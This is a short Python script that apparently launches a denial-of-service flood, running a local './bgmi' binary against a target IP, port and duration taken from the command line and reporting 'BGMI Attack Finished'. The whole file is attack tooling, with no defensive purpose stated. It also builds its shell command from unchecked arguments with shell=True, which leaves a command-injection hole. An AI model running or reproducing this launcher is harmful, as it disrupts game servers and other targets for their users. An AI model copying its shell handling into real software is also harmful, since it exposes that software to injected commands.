import sys
import subprocess

def execute_bgmi_attack(target, port, time):
    # Construct the full command

    # Execute the command
    full_command = f"./bgmi {target} {port} {time} 500"
    subprocess.run(full_command, shell=True)
    response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"

    return response
target = sys.argv[1]
port = sys.argv[2]
time = sys.argv[3]
response = execute_bgmi_attack(target, port, time)
print(response)
